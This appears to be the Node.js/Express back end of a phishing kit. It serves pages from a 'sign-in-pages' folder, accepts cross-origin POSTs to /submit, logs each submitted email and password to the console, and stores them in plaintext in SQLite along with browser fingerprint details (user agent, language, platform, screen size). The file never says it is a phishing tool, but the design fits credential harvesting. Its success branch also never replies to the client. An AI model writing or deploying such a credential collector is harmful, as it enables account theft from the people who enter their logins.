const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'sign-in-pages'))) // serves index.html

// Connect to SQLite (creates file if it doesn't exist)
const db = new sqlite3.Database('./database.db', (err) => {
  if (err) console.error(err);
  else console.log('Connected to SQLite database');
});

// Create table if it doesn't exist
db.run(`CREATE TABLE IF NOT EXISTS submissions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT,
  password TEXT,
  timestamp TEXT,
  userAgent TEXT,
  language TEXT,
  platform TEXT,
  screen TEXT,
  submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

app.post('/submit', express.json(), (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');     // or your specific domain
  res.header('Access-Control-Allow-Methods', 'POST');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  console.log('📥 Received data:', req.body);
  const { email, password, timestamp, userAgent,
          language, platform, screen} = req.body;

db.run(`INSERT INTO submissions (email, password, timestamp,
 userAgent, language, platform, screen)
 VALUES (?, ?, ?, ?, ?, ?, ?)
  `, [email, password, timestamp, userAgent, language, platform, screen],
  function (err) {
  if (err) {
  console.error(err);
   return res.status(500).send('Database error');}
});
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
  console.log(`Open your browser → http://localhost:${PORT}`);
});
